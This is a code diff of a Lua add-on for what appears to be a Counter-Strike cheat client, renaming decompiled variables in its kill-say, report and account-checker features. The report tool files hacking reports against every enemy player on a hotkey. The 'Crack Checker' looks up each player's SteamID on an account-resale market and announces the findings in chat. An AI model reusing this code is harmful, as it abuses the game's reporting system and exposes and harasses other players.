-								var_139_3.helper4[#var_139_3.helper4 + 1] = var_139_8
+						for i=22, 28 do
+							local cmd = cmds[i]
+							if cmd then
+								HelperCMDS.helper4[#HelperCMDS.helper4 + 1] = cmd
 							end
 						end
-
-						for iter_139_8 = 29, 35 do
-							local var_139_9 = var_139_4[iter_139_8]
-
-							if var_139_9 then
-								var_139_3.helper5[#var_139_3.helper5 + 1] = var_139_9
+						for i=29, 35 do
+							local cmd = cmds[i]
+							if cmd then
+								HelperCMDS.helper5[#HelperCMDS.helper5 + 1] = cmd
 							end
 						end
-
-						for iter_139_9 = 36, 42 do
-							local var_139_10 = var_139_4[iter_139_9]
-
-							if var_139_10 then
-								var_139_3.helper6[#var_139_3.helper6 + 1] = var_139_10
+						for i=36, 42 do
+							local cmd = cmds[i]
+							if cmd then
+								HelperCMDS.helper6[#HelperCMDS.helper6 + 1] = cmd
 							end
 						end
-
-						for iter_139_10 = 43, 49 do
-							local var_139_11 = var_139_4[iter_139_10]
-
-							if var_139_11 then
-								var_139_3.helper7[#var_139_3.helper7 + 1] = var_139_11
+						for i=43, 49 do
+							local cmd = cmds[i]
+							if cmd then
+								HelperCMDS.helper7[#HelperCMDS.helper7 + 1] = cmd
 							end
 						end
+						
+						ui.set(CPLua.CustomKillSay.helper1, table.concat(HelperCMDS.helper1, ', ') )
+						ui.set(CPLua.CustomKillSay.helper2, table.concat(HelperCMDS.helper2, ', ') )
+						ui.set(CPLua.CustomKillSay.helper3, table.concat(HelperCMDS.helper3, ', ') )
+						ui.set(CPLua.CustomKillSay.helper4, table.concat(HelperCMDS.helper4, ', ') )
+						ui.set(CPLua.CustomKillSay.helper5, table.concat(HelperCMDS.helper5, ', ') )
+						ui.set(CPLua.CustomKillSay.helper6, table.concat(HelperCMDS.helper6, ', ') )
+						ui.set(CPLua.CustomKillSay.helper7, table.concat(HelperCMDS.helper7, ', ') )
 
-						ui.set(var_10_0.CustomKillSay.helper1, table.concat(var_139_3.helper1, ", "))
-						ui.set(var_10_0.CustomKillSay.helper2, table.concat(var_139_3.helper2, ", "))
-						ui.set(var_10_0.CustomKillSay.helper3, table.concat(var_139_3.helper3, ", "))
-						ui.set(var_10_0.CustomKillSay.helper4, table.concat(var_139_3.helper4, ", "))
-						ui.set(var_10_0.CustomKillSay.helper5, table.concat(var_139_3.helper5, ", "))
-						ui.set(var_10_0.CustomKillSay.helper6, table.concat(var_139_3.helper6, ", "))
-						ui.set(var_10_0.CustomKillSay.helper7, table.concat(var_139_3.helper7, ", "))
-						ui.set_visible(var_10_0.CustomKillSay.helper1, #var_139_3.helper1 > 0)
-						ui.set_visible(var_10_0.CustomKillSay.helper2, #var_139_3.helper2 > 0)
-						ui.set_visible(var_10_0.CustomKillSay.helper3, #var_139_3.helper3 > 0)
-						ui.set_visible(var_10_0.CustomKillSay.helper4, #var_139_3.helper4 > 0)
-						ui.set_visible(var_10_0.CustomKillSay.helper5, #var_139_3.helper5 > 0)
-						ui.set_visible(var_10_0.CustomKillSay.helper6, #var_139_3.helper6 > 0)
-						ui.set_visible(var_10_0.CustomKillSay.helper7, #var_139_3.helper7 > 0)
+						ui.set_visible(CPLua.CustomKillSay.helper1, #HelperCMDS.helper1 > 0)
+						ui.set_visible(CPLua.CustomKillSay.helper2, #HelperCMDS.helper2 > 0)
+						ui.set_visible(CPLua.CustomKillSay.helper3, #HelperCMDS.helper3 > 0)
+						ui.set_visible(CPLua.CustomKillSay.helper4, #HelperCMDS.helper4 > 0)
+						ui.set_visible(CPLua.CustomKillSay.helper5, #HelperCMDS.helper5 > 0)
+						ui.set_visible(CPLua.CustomKillSay.helper6, #HelperCMDS.helper6 > 0)
+						ui.set_visible(CPLua.CustomKillSay.helper7, #HelperCMDS.helper7 > 0)
 					end
 				else
-					ui.set(var_10_0.CustomKillSay.helper1, "Helper: " .. var_139_0 .. "_")
-					ui.set_visible(var_10_0.CustomKillSay.helper2, false)
-					ui.set_visible(var_10_0.CustomKillSay.helper3, false)
-					ui.set_visible(var_10_0.CustomKillSay.helper4, false)
-					ui.set_visible(var_10_0.CustomKillSay.helper5, false)
-					ui.set_visible(var_10_0.CustomKillSay.helper6, false)
-					ui.set_visible(var_10_0.CustomKillSay.helper7, false)
+					ui.set(CPLua.CustomKillSay.helper1, 'Helper: ' .. TemplateText)
+					ui.set_visible(CPLua.CustomKillSay.helper2, false)
+					ui.set_visible(CPLua.CustomKillSay.helper3, false)
+					ui.set_visible(CPLua.CustomKillSay.helper4, false)
+					ui.set_visible(CPLua.CustomKillSay.helper5, false)
+					ui.set_visible(CPLua.CustomKillSay.helper6, false)
+					ui.set_visible(CPLua.CustomKillSay.helper7, false)
 				end
 			end
 		end)
-		client.set_event_callback("player_death", function(arg_140_0)
-			if not ui.get(var_10_0.CustomKillSay.enable) then
-				return
-			end
 
-			local var_140_0 = entity.get_local_player()
-			local var_140_1 = client.userid_to_entindex(arg_140_0.attacker)
-			local var_140_2 = client.userid_to_entindex(arg_140_0.userid)
+		client.set_event_callback('player_death', function(e)
+			if not ui.get(CPLua.CustomKillSay.enable) then return end
 
-			if var_140_1 == var_140_0 and var_140_1 ~= var_140_2 then
-				local var_140_3 = {}
+			local LocalPlayer = entity.get_local_player()
+			local Attacker = client.userid_to_entindex(e.attacker)
+			local Victim = client.userid_to_entindex(e.userid)
+			if ( Attacker == LocalPlayer and Attacker ~= Victim ) then
+				local ProcessedData = {}
+				for i, v in ipairs(helperData) do
+					local key = v[1]
+					local title = v[2]
+					local func = v[3]
 
-				for iter_140_0, iter_140_1 in ipairs(var_10_16) do
-					local var_140_4 = iter_140_1[1]
-					local var_140_5 = iter_140_1[2]
-
-					var_140_3[var_140_4] = iter_140_1[3](var_140_2, var_140_1, arg_140_0.userid, arg_140_0.attacker)
+					ProcessedData[key] = func(Victim, Attacker, e.userid, e.attacker)
 				end
-
-				local var_140_6 = processTags(ui.get(var_10_0.CustomKillSay.template), var_140_3)
-
-				MessageQueue:Say(var_140_6)
+				local Processed = processTags(ui.get(CPLua.CustomKillSay.template), ProcessedData)
+				--CPLua.ChatMethods['Game Chat'](Processed)
+				MessageQueue:Say(Processed)
 			end
 		end)
 	end
+	--#endregion
 
-	if var_0_18.get("Report Enemy Tool") then
-		var_10_0.ReportTool = {}
-		var_10_0.ReportTool.enable = ui.new_checkbox("Lua", "B", "Report Tool")
-		var_10_0.ReportTool.hotkey = ui.new_hotkey("Lua", "B", "Report Tool", true)
-
-		local var_10_18 = {
-			{
-				"textabuse",
-				"Comms Abuse"
-			},
-			{
-				"voiceabuse",
-				"Voice Abuse"
-			},
-			{
-				"grief",
-				"Griefing"
-			},
-			{
-				"aimbot",
-				"Aim Hacking"
-			},
-			{
-				"wallhack",
-				"Wall Hacking"
-			},
-			{
-				"speedhack",
-				"Other Hacking"
-			}
+	--#region Report Enemy Tool
+	if ( Feature.get('Report Enemy Tool') ) then
+		CPLua.ReportTool = {}
+		CPLua.ReportTool.enable = ui.new_checkbox('Lua', 'B', 'Report Tool')
+		CPLua.ReportTool.hotkey = ui.new_hotkey('Lua', 'B', 'Report Tool', true)
+		
+		local ReportTypes = {
+			{'textabuse', 'Comms Abuse'},
+			{'voiceabuse', 'Voice Abuse'},
+			{'grief', 'Griefing'},
+			{'aimbot', 'Aim Hacking'},
+			{'wallhack', 'Wall Hacking'},
+			{'speedhack', 'Other Hacking'}
 		}
-		local var_10_19 = {}
-		local var_10_20 = {}
-
-		for iter_10_2, iter_10_3 in ipairs(var_10_18) do
-			var_10_19[#var_10_19 + 1] = iter_10_3[2]
-			var_10_20[iter_10_3[2]] = iter_10_3[1]
+		local ReportTypeNames = {}
+		local ReportTypeRef = {}
+		for index, ReportType in ipairs(ReportTypes) do
+			ReportTypeNames[#ReportTypeNames + 1] = ReportType[2]
+			ReportTypeRef[ReportType[2]] = ReportType[1]
 		end
+		CPLua.ReportTool.types = ui.new_multiselect('Lua', 'B', 'Types', ReportTypeNames)
+		ui.set(CPLua.ReportTool.types, {'Aim Hacking', 'Wall Hacking', 'Other Hacking'})
 
-		var_10_0.ReportTool.types = ui.new_multiselect("Lua", "B", "Types", var_10_19)
-
-		ui.set(var_10_0.ReportTool.types, {
-			"Aim Hacking",
-			"Wall Hacking",
-			"Other Hacking"
-		})
-
-		local var_10_21
-
-		local function var_10_22()
-			if var_10_21 or not ui.get(var_10_0.ReportTool.enable) then
-				return
+		local ReportingActive
+		local function ReportNoobs()
+			if ( ReportingActive or not ui.get(CPLua.ReportTool.enable) ) then return end
+			local Types = ui.get(CPLua.ReportTool.types)
+			local ReportTypes = ''
+			for i, v in pairs(Types) do
+				ReportTypes = ( i == 1 and ReportTypeRef[v] or ReportTypes..','..ReportTypeRef[v] )
 			end
 
-			local var_141_0 = ui.get(var_10_0.ReportTool.types)
-			local var_141_1 = ""
-
-			for iter_141_0, iter_141_1 in pairs(var_141_0) do
-				var_141_1 = iter_141_0 == 1 and var_10_20[iter_141_1] or var_141_1 .. "," .. var_10_20[iter_141_1]
-			end
-
-			local var_141_2 = {}
-
-			for iter_141_2 = 1, globals.maxplayers() do
-				local var_141_3 = var_0_9.GetPlayerXuidStringFromEntIndex(iter_141_2)
-
-				if var_141_3:len() > 5 and entity.is_enemy(iter_141_2) then
-					var_141_2[#var_141_2 + 1] = var_141_3
+			local ReportQueue = {}
+			for Player=1, globals.maxplayers() do
+				local SteamXUID = GameStateAPI.GetPlayerXuidStringFromEntIndex(Player)
+				if ( SteamXUID:len() > 5 and entity.is_enemy(Player) ) then
+					ReportQueue[#ReportQueue + 1] = SteamXUID
 				end
 			end
 
-			for iter_141_3, iter_141_4 in ipairs(var_141_2) do
-				var_10_21 = true
-
-				client.delay_call((iter_141_3 - 1) * 1, function()
-					var_0_9.SubmitPlayerReport(iter_141_4, var_141_1)
-
-					if iter_141_3 == #var_141_2 then
+			-- Actual Reporting
+			for index, Reportee in ipairs(ReportQueue) do
+				ReportingActive = true
+				client.delay_call((index - 1) * 1, function()
+					GameStateAPI.SubmitPlayerReport(Reportee, ReportTypes)
+					if ( index == #ReportQueue ) then
 						client.delay_call(1, function()
-							var_10_21 = false
+							ReportingActive = false
 						end)
 					end
 				end)
 			end
 		end
-
-		client.set_event_callback("net_update_end", function()
-			local var_144_0, var_144_1 = ui.get(var_10_0.ReportTool.hotkey)
-
-			if var_144_0 and not ui.is_menu_open() then
-				var_10_22()
+		
+		client.set_event_callback('net_update_end', function()
+			local KeyState, Key = ui.get(CPLua.ReportTool.hotkey)
+			if ( KeyState and not ui.is_menu_open() ) then
+				ReportNoobs()
 			end
 		end)
 
-		var_10_0.ReportTool.submit = ui.new_button("Lua", "B", "Report!", var_10_22)
 
-		ui.set_callback(var_10_0.ReportTool.enable, function(arg_145_0)
-			local var_145_0 = ui.get(arg_145_0)
+		CPLua.ReportTool.submit = ui.new_button('Lua', 'B', 'Report!', ReportNoobs)
 
-			ui.set_visible(var_10_0.ReportTool.types, var_145_0)
-			ui.set_visible(var_10_0.ReportTool.submit, var_145_0)
+		ui.set_callback(CPLua.ReportTool.enable, function(self)
+			local Status = ui.get(self)
+			ui.set_visible(CPLua.ReportTool.types, Status)
+			ui.set_visible(CPLua.ReportTool.submit, Status)
 		end)
-		ui.set_visible(var_10_0.ReportTool.types, false)
-		ui.set_visible(var_10_0.ReportTool.submit, false)
+		ui.set_visible(CPLua.ReportTool.types, false)
+		ui.set_visible(CPLua.ReportTool.submit, false)
 	end
+	--#endregion
 
-	if var_0_18.get("Account Checkers") then
-		local var_10_23 = {
-			registered = {}
-		}
+	--#region Checkers
+	if ( Feature.get('Account Checkers') ) then
 
-		function var_10_23.new(arg_146_0, arg_146_1, arg_146_2)
-			local var_146_0 = {
-				name = arg_146_0,
-				desc = arg_146_1,
-				callback = arg_146_2,
-				cache = {},
-				start = function(arg_147_0)
-					return
-				end,
-				stop = function(arg_148_0)
-					return
-				end,
-				isRunning = function(arg_149_0)
-					return
-				end
-			}
+		--#region Main Checker Code
+		local Checkers = { registered = {} }
 
-			var_10_23.registered[#var_10_23.registered + 1] = var_146_0
+		function Checkers.new(checkerName, checkerDescription, checkerCallback)
+			local mt = {}
+			mt.name = checkerName
+			mt.desc = checkerDescription
+			mt.callback = checkerCallback
+			mt.cache = {}
 
-			return var_146_0
+			function mt:start()
+
+			end
+
+			function mt:stop()
+
+			end
+
+			function mt:isRunning()
+
+			end
+
+			Checkers.registered[#Checkers.registered + 1] = mt
+
+			return mt
 		end
 
-		local var_10_24 = false
+		local CheckStatus = false
 
-		function var_10_23._StartBTN()
-			if var_10_24 then
-				return
-			end
+		function Checkers._StartBTN()
+			if ( CheckStatus ) then return end
+			CheckStatus = true
 
-			var_10_24 = true
+			local Type = ui.get(Checkers.type)
+			local TypeMT, InLobby
 
-			local var_150_0 = ui.get(var_10_23.type)
-			local var_150_1
-			local var_150_2
-
-			for iter_150_0, iter_150_1 in ipairs(var_10_23.registered) do
-				if iter_150_1.name == var_150_0 then
-					var_150_1 = iter_150_1
+			for i, RegisteredItem in ipairs(Checkers.registered) do
+				if ( RegisteredItem.name == Type ) then
+					TypeMT = RegisteredItem
 				end
 			end
 
-			if var_150_1 then
-				local var_150_3 = ui.get(var_10_23.target)
-				local var_150_4 = {}
-
-				if var_0_9.IsConnectedOrConnectingToServer() then
-					for iter_150_2 = 1, globals.maxplayers() do
-						local var_150_5 = var_0_9.GetLocalPlayerXuid()
-						local var_150_6 = var_0_9.GetPlayerXuidStringFromEntIndex(iter_150_2)
-						local var_150_7 = var_0_9.ArePlayersEnemies(var_150_5, var_150_6)
-
-						if var_150_6 and var_150_6:len() == 17 and (var_150_3 == "Everyone" or var_150_3 == "Teammates" and not var_150_7 or var_150_3 == "Enemies" and var_150_7) then
-							var_150_4[#var_150_4 + 1] = {
-								var_150_6,
-								entity.get_player_name(iter_150_2)
-							}
+			if ( TypeMT ) then
+				-- Target Acquisition
+				local Target = ui.get(Checkers.target)
+				local Targets = {}
+				if ( GameStateAPI.IsConnectedOrConnectingToServer() ) then
+					for Player=1, globals.maxplayers() do
+						local LocalXUID = GameStateAPI.GetLocalPlayerXuid()
+						local SteamXUID = GameStateAPI.GetPlayerXuidStringFromEntIndex(Player)
+						local IsEnemy = GameStateAPI.ArePlayersEnemies(LocalXUID, SteamXUID)
+						if ( SteamXUID and SteamXUID:len() == 17 ) then
+							if ( ( Target == 'Everyone' ) or (Target == 'Teammates' and not IsEnemy) or (Target == 'Enemies' and IsEnemy) ) then
+								Targets[#Targets + 1] = {SteamXUID, entity.get_player_name(Player)}
+							end
 						end
 					end
-				elseif var_0_14.IsSessionActive() then
+				elseif ( LobbyAPI.IsSessionActive() ) then
 					IsLobby = true
-
-					for iter_150_3 = 0, var_0_12.GetCount() - 1 do
-						local var_150_8 = var_0_12.GetXuidByIndex(iter_150_3)
-
-						var_150_4[#var_150_4 + 1] = {
-							var_150_8,
-							var_0_12.GetFriendName(var_150_8)
-						}
+					for index=0, PartyListAPI.GetCount()-1 do
+						local SteamXUID = PartyListAPI.GetXuidByIndex(index)
+						Targets[#Targets + 1] = {SteamXUID, PartyListAPI.GetFriendName(SteamXUID)}
 					end
 				end
 
-				if #var_150_4 > 0 then
-					ui.set(var_10_23.status, "Status: Checking 0/" .. #var_150_4 .. "!")
+				if #Targets > 0 then
+					ui.set(Checkers.status, 'Status: Checking 0/' .. #Targets .. '!')
 
-					local var_150_9 = 1
+					local CurrentTarget = 1
 
-					function DispatchMessageOut(arg_151_0, arg_151_1, arg_151_2)
-						ui.set(var_10_23.status, "Status: Checking " .. arg_151_1 .. "/" .. #arg_151_2 .. "!")
+					function DispatchMessageOut(TargetSteamID, Target, Targets)
+						ui.set(Checkers.status, 'Status: Checking ' .. Target .. '/' .. #Targets .. '!')
 
-						local var_151_0 = var_150_1.cache[arg_151_0]
-
-						if var_151_0 then
-							if var_0_9.IsConnectedOrConnectingToServer() then
-								local var_151_1 = ui.get(var_10_23.output)
-								local var_151_2 = var_151_0.server
-
-								if var_151_0.localchat and not var_151_0.server then
-									var_151_2 = var_151_0.localchat
-									var_151_1 = "Local Chat"
+						local data = TypeMT.cache[TargetSteamID]
+						if ( data ) then
+							if ( GameStateAPI.IsConnectedOrConnectingToServer() ) then
+								local Output = ui.get(Checkers.output)
+								local Msg = data.server
+								
+								if ( data.localchat and not data.server ) then
+									Msg = data.localchat
+									Output = 'Local Chat'
 								end
 
-								var_10_0.ChatMethods[var_151_1](var_151_2)
-							elseif var_151_0.lobby and var_0_14.IsSessionActive() then
-								local var_151_3 = ui.get(var_10_23.output)
-
-								if var_151_3 ~= "Console" then
-									var_151_3 = "Party Chat"
+								CPLua.ChatMethods[Output](Msg)
+							elseif ( data.lobby and LobbyAPI.IsSessionActive() ) then
+								local Output = ui.get(Checkers.output)
+								if ( Output ~= 'Console' ) then
+									Output = 'Party Chat'
 								end
-
-								var_10_0.ChatMethods[var_151_3](var_150_1.cache[arg_151_0].lobby)
+								CPLua.ChatMethods[Output](TypeMT.cache[TargetSteamID].lobby)
 							end
 						end
 
-						if var_150_9 == #arg_151_2 then
-							var_10_24 = false
-
-							ui.set(var_10_23.status, "Status: Finished " .. arg_151_1 .. "/" .. #arg_151_2 .. "!")
+						if ( Target == #Targets ) then
+							-- Finished
+							CheckStatus = false
+							ui.set(Checkers.status, 'Status: Finished ' .. Target .. '/' .. #Targets .. '!')
 						end
 					end
 
-					function CheckTarget(arg_152_0)
-						if var_150_4[arg_152_0] then
-							local var_152_0 = var_150_4[arg_152_0][1]
-							local var_152_1 = var_150_4[arg_152_0][2]
-
-							if var_150_1.cache[var_152_0] then
-								DispatchMessageOut(var_152_0, arg_152_0, var_150_4)
-
-								var_150_9 = var_150_9 + 1
-
-								CheckTarget(var_150_9)
+					function CheckTarget(Target)
+						if ( Targets[Target] ) then
+							local TargetSteamID = Targets[Target][1]
+							local TargetName = Targets[Target][2]
+							if ( TypeMT.cache[TargetSteamID] ) then
+								DispatchMessageOut(TargetSteamID, Target, Targets)
+								CurrentTarget = CurrentTarget + 1
+								CheckTarget(CurrentTarget)
 							else
-								var_150_1.callback(var_152_0, var_152_1, function(arg_153_0)
-									if arg_153_0 then
-										var_150_1.cache[var_152_0] = var_150_1.cache[var_152_0] or {}
-										var_150_1.cache[var_152_0].server = arg_153_0.server and "[" .. var_150_1.name .. "] " .. arg_153_0.server
-										var_150_1.cache[var_152_0].localchat = arg_153_0.localchat and " \a[" .. var_150_1.name .. "] \n" .. arg_153_0.localchat
-										var_150_1.cache[var_152_0].lobby = arg_153_0.lobby and "[" .. var_150_1.desc .. "] " .. arg_153_0.lobby
+								TypeMT.callback(TargetSteamID, TargetName, function(data)							
+
+									if ( data ) then
+										TypeMT.cache[TargetSteamID] = TypeMT.cache[TargetSteamID] or {}
+
+										TypeMT.cache[TargetSteamID].server = data.server and '[' .. TypeMT.name .. '] ' .. data.server
+										TypeMT.cache[TargetSteamID].localchat = data.localchat and ' \x07[' .. TypeMT.name .. '] \x0A' .. data.localchat
+										TypeMT.cache[TargetSteamID].lobby = data.lobby and '[' .. TypeMT.desc .. '] ' .. data.lobby
 									end
+									
+									DispatchMessageOut(TargetSteamID, Target, Targets)
 
-									DispatchMessageOut(var_152_0, arg_152_0, var_150_4)
-
-									var_150_9 = var_150_9 + 1
-
-									CheckTarget(var_150_9)
-								end, function(arg_154_0)
-									if arg_154_0 then
-										if var_0_9.IsConnectedOrConnectingToServer() then
-											local var_154_0 = ui.get(var_10_23.output)
-
-											var_10_0.ChatMethods[var_154_0](arg_154_0)
-										elseif var_0_14.IsSessionActive() then
-											var_10_0.ChatMethods["Party Chat"](arg_154_0)
+									CurrentTarget = CurrentTarget + 1
+									CheckTarget(CurrentTarget)
+								end, function(msg)
+									if ( msg ) then
+										if ( GameStateAPI.IsConnectedOrConnectingToServer() ) then
+											local Output = ui.get(Checkers.output)
+											CPLua.ChatMethods[Output](msg)
+										elseif ( LobbyAPI.IsSessionActive() ) then
+											CPLua.ChatMethods['Party Chat'](msg)
 										end
 									end
-
-									CheckTarget(var_150_9)
-								end, function()
-									var_10_24 = false
-
-									ui.set(var_10_23.status, "Status: Finished " .. #var_150_4 .. "/" .. #var_150_4 .. "!")
-								end, var_150_1)
+									CheckTarget(CurrentTarget)
+								end, TypeMT)
 							end
 						end
 					end
-
-					CheckTarget(var_150_9)
+				
+					CheckTarget(CurrentTarget)
 				end
 			end
 		end
+		--#endregion
+		
+		--#region Checker Definitions
 
-		if var_0_18.get("Crack Checker") then
-			local function var_10_25(arg_156_0, arg_156_1)
-				if var_0_20 == nil then
-					var_0_20 = LolzPanorama.get_data()
+		--#region Lolz.Guru Checker
+		if ( Feature.get('Crack Checker') ) then
+			local function check_lolzteam_impl(steamid, callback)
+				if lolz_data == nil then
+					lolz_data = LolzPanorama.get_data()
 
-					if var_0_20 ~= nil then
-						var_0_20 = json.parse(tostring(var_0_20))
+					if lolz_data ~= nil then
+						lolz_data = json.parse(tostring(lolz_data))
 					else
-						client.delay_call(0.1, var_10_25, arg_156_0, arg_156_1)
-
+						client.delay_call(0.1, check_lolzteam_impl, steamid, callback)
 						return
 					end
 				end
 
-				if var_0_20 ~= nil then
-					local var_156_0 = {
+				if lolz_data ~= nil then
+					local params = {
 						user_id = "",
-						new = true,
-						_xfResponseType = "json",
-						_xfNoRedirect = "1",
-						_xfRequestUri = "/market/steam/",
-						order_by = "pdate_to_down",
-						_formSubmitted = "true",
-						_itemCount = "1",
 						category_id = "1",
-						title = arg_156_0
+						title = steamid,
+						_itemCount = "1",
+						_formSubmitted = "true",
+						order_by = "pdate_to_down",
+						_xfRequestUri = "/market/steam/",
+						_xfNoRedirect = "1",
+						_xfResponseType = "json",
+						new = true
 					}
-					local var_156_1 = {
-						Cookie = var_0_20.cookie
+					local headers = {
+						Cookie = lolz_data.cookie
 					}
 
-					var_0_2.get("https://lolz.guru/market", {
-						params = var_156_0,
-						headers = var_156_1
-					}, function(arg_157_0, arg_157_1)
-						if arg_157_1.status == 200 then
-							local var_157_0 = json.parse(arg_157_1.body)
+					http.get("https://lolz.guru/market", {params=params, headers=headers}, function(success, response)
+						if response.status == 200 then
+							local result = json.parse(response.body)
 
-							arg_156_1(arg_157_0, arg_157_1, var_157_0)
+							callback(success, response, result)
 						else
-							arg_156_1(arg_157_0, arg_157_1)
+							callback(success, response)
 						end
 					end)
+
 				end
 			end
 
-			local function var_10_26(...)
-				if var_0_20 == nil then
+			local function check_lolzteam(...)
+				if lolz_data == nil then
 					LolzPanorama.create()
-					client.delay_call(0.1, var_10_25, ...)
+					client.delay_call(0.1, check_lolzteam_impl, ...)
 				else
-					var_10_25(...)
+					check_lolzteam_impl(...)
 				end
 			end
 
-			var_10_23.new("Crack Checker", "CrackCheck", function(arg_159_0, arg_159_1, arg_159_2, arg_159_3, arg_159_4, arg_159_5)
-				var_10_26(arg_159_0, function(arg_160_0, arg_160_1, arg_160_2)
-					if arg_160_1.status == 200 then
-						local var_160_0 = arg_160_2.templateHtml
-						local var_160_1 = {}
-						local var_160_2 = "(<div id=\"marketItem%-%-.+\">.+class=\"marketIndexItem%-%-topContainer\")"
-
-						for iter_160_0 in var_160_0:gmatch(var_160_2) do
-							local var_160_3 = iter_160_0:match("<div id=\"marketItem%-%-(%d+)\"")
-							local var_160_4 = iter_160_0:match("<span class=\"Value\">(%d+,?.?%d+)</span>"):gsub(",", ".")
-
-							var_160_1[#var_160_1 + 1] = {
-								var_160_3,
-								math.floor(var_160_4 * 100) / 100
-							}
+			Checkers.new('Crack Checker', 'CrackCheck', function(steamid, name, next, retry, TypeMT)
+				check_lolzteam(steamid, function(success, response, result)
+					if ( response.status == 200 ) then
+						local HTML = result.templateHtml
+						local Matches = {}
+						local Pattern = '(<div id="marketItem%-%-.+">.+class="marketIndexItem%-%-topContainer")'
+						for Found in HTML:gmatch(Pattern) do
+							local MarketID = Found:match('<div id="marketItem%-%-(%d+)"')
+							local Price = Found:match('<span class="Value">(%d+,?.?%d+)</span>'):gsub(',','.')
+							Matches[#Matches + 1] = { MarketID, math.floor(Price * 100)/100 }
 						end
+						if ( #Matches > 0 ) then
+							local ReplaceData = {}
+							ReplaceData.name = name
+							ReplaceData.id = steamid
+							ReplaceData.times = #Matches
+							ReplaceData.price = string.format('%.2f', Matches[1][2])
+							ReplaceData.marketid = Matches[1][1]
+							ReplaceData.link =  'https://lolz.guru/market/'..ReplaceData.marketid
 
-						if #var_160_1 > 0 then
-							local var_160_5 = {
-								name = arg_159_1,
-								id = arg_159_0,
-								times = #var_160_1,
-								price = string.format("%.2f", var_160_1[1][2]),
-								marketid = var_160_1[1][1]
-							}
-
-							var_160_5.link = "https://lolz.guru/market/" .. var_160_5.marketid
-
-							local var_160_6 = {}
-							local var_160_7 = {}
-
-							for iter_160_1, iter_160_2 in ipairs(var_160_1) do
-								var_160_6[#var_160_6 + 1] = iter_160_2[2]
-								var_160_7[#var_160_7 + 1] = iter_160_2[1]
+							local Prices = {}
+							local Links = {}
+							for index, value in ipairs(Matches) do
+								Prices[#Prices + 1] = value[2]
+								Links[#Links + 1] = value[1]
 							end
+							ReplaceData.min = math.min(unpack(Prices))
+							ReplaceData.max = math.max(unpack(Prices))
+							
+							ReplaceData.links = table.concat(Links, ', ')
 
-							var_160_5.min = math.min(unpack(var_160_6))
-							var_160_5.max = math.max(unpack(var_160_6))
-							var_160_5.links = table.concat(var_160_7, ", ")
-
-							local var_160_8 = {
-								server = processTags("Acc {name} sold {times} times for {price}usd on LolzTeam, market ID: {marketID}", var_160_5),
-								lobby = processTags("Acc {name} - {price}USD - ID: {marketID}", var_160_5)
-							}
-
-							arg_159_2(var_160_8)
+							local data = {}
+							data.server = processTags('Acc {name} sold {times} times for {price}usd on LolzTeam, market ID: {marketID}', ReplaceData)
+							data.lobby = processTags('Acc {name} - {price}USD - ID: {marketID}', ReplaceData)
+							next(data)
 						else
-							local var_160_9 = {
-								localchat = arg_159_1 .. "'s account was not sold on Lolz.Team."
-							}
-
-							arg_159_2(var_160_9)
+							local data = {}
+							data.localchat = name .. '\'s account was not sold on Lolz.Team.'
+							next(data)
 						end
 					else
-						local var_160_10 = {
-							localchat = arg_159_1 .. "'s failed to check with Lolz.guru, is Lolz offline?"
-						}
-
-						arg_159_2(var_160_10)
+						local data = {}
+						data.localchat = name .. '\'s failed to check with Lolz.guru, is Lolz offline?'
+						next(data)
 					end
 				end)
 			end)
 		end
+		--#endregion
 
-		if var_0_18.get("Faceit Checker") then
-			local var_10_27
+		--#region Face.it Checker
+		if ( Feature.get('Faceit Checker') ) then
+			local FaceitConfiguration
 
-			var_10_23.new("Faceit Checker", "FACEIT", function(arg_161_0, arg_161_1, arg_161_2, arg_161_3, arg_161_4, arg_161_5)
-				if not var_10_27 then
-					var_0_2.get("https://api.faceit.com/stats/v1/stats/configuration/csgo", function(arg_162_0, arg_162_1)
-						var_10_27 = json.parse(arg_162_1.body)
-
-						arg_161_3()
+			Checkers.new('Faceit Checker', 'FACEIT', function(steamid, name, next, retry, TypeMT)
+				if ( not FaceitConfiguration ) then
+					http.get('https://api.faceit.com/stats/v1/stats/configuration/csgo', function(success, response)
+						FaceitConfiguration = json.parse(response.body)
+						retry()
 					end)
-
 					return
 				end
 
-				var_0_2.get("https://api.faceit.com/search/v1/?limit=3&query=" .. arg_161_0, function(arg_163_0, arg_163_1)
-					if arg_163_0 then
-						local var_163_0 = json.parse(arg_163_1.body)
-						local var_163_1 = {}
-
-						if var_163_0 and var_163_0.payload.players.total_count > 0 then
-							local var_163_2 = var_163_0.payload.players.results[#var_163_0.payload.players.results]
-
-							var_163_1.id = var_163_2.id
-							var_163_1.nickname = var_163_2.nickname
-							var_163_1.country = var_163_2.country
-
-							var_0_2.get("https://api.faceit.com/stats/v1/stats/users/" .. var_163_1.id .. "/games/csgo", function(arg_164_0, arg_164_1)
-								if not arg_164_0 then
-									return arg_161_3()
+				http.get('https://api.faceit.com/search/v1/?limit=3&query=' .. steamid, function(success, response)
+					if ( success ) then
+						local Data = json.parse(response.body)
+						local Output = {};
+						if ( Data and Data.payload.players.total_count > 0 ) then
+							local UserResult = Data.payload.players.results[#Data.payload.players.results];
+							Output.id = UserResult.id;
+							Output.nickname = UserResult.nickname;
+							Output.country = UserResult.country;
+							http.get('https://api.faceit.com/stats/v1/stats/users/' .. Output.id .. '/games/csgo', function(_success, _response)
+								if ( not _success ) then
+									return retry()
 								end
-
-								local var_164_0 = json.parse(arg_164_1.body)
-
-								if var_164_0 then
-									local var_164_1 = var_10_27.grouping.main_stats[5]
-									local var_164_2 = var_10_27.grouping.user_win_rate
-									local var_164_3 = var_10_27.grouping.main_stats[6]
-									local var_164_4 = var_10_27.grouping.main_stats[1]
-									local var_164_5 = {
-										name = arg_161_1,
-										steamid = arg_161_0,
-										id = var_163_1.id,
-										user = var_163_1.nickname,
-										country = var_163_1.country
-									}
-
-									if var_164_0.lifetime then
-										var_163_1.kdratio = var_164_0.lifetime[var_164_1]
-										var_163_1.winratio = var_164_0.lifetime[var_164_2]
-										var_163_1.hschance = var_164_0.lifetime[var_164_3]
-										var_163_1.matches = var_164_0.lifetime[var_164_4]
-										var_164_5.kdratio = var_163_1.kdratio
-										var_164_5.win = var_163_1.winratio .. "%"
-										var_164_5.hschance = var_163_1.hschance
-										var_164_5.matches = var_163_1.matches
+								local Stats = json.parse(_response.body)
+								if ( Stats ) then
+									local config_kdratio = FaceitConfiguration.grouping.main_stats[5];
+									local config_winratio = FaceitConfiguration.grouping.user_win_rate;
+									local config_hschance = FaceitConfiguration.grouping.main_stats[6];
+									local config_matches = FaceitConfiguration.grouping.main_stats[1];
+									
+									local ReplaceData = {}
+									ReplaceData.name = name
+									ReplaceData.steamid = steamid
+									ReplaceData.id = Output.id
